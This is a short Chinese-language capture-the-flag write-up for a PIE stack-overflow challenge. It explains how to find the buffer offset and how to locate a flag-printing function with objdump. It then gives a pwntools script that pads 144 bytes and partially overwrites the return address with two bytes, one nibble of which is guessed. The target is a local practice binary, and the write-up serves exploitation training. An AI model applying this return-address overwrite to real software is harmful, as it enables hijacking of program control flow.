# 挑战简介
```
如果你能找到easy题的规律,稍微会看点IDA,这题没什么难的
```

# 思路
- 首先要知道偏移量
- 其次已知偏移量,在插入位置插入后三个半字节,而这个半字节偏移量可以用objdump -d /···| less来查看恰好跳过检测的,输出flag的位置,此题经查看,输出位置是1df1,所以后三个半字节应当是df1,插入格式是\xf1\x1d # 1是随机数
以上,题目自然迎刃而解
```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-pie-overflow')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
win_authed_address = p64(0x1df1)      # 无意义,当然这也是8byte的偏移量,相当于实际偏移量是144+8=152
#offset_last = 
payload = b'a' * 144 + win_authed_address + b'\xf1\x1d'     # 后1是随机数,继续强调
p.send(payload)
p.recvall()
```
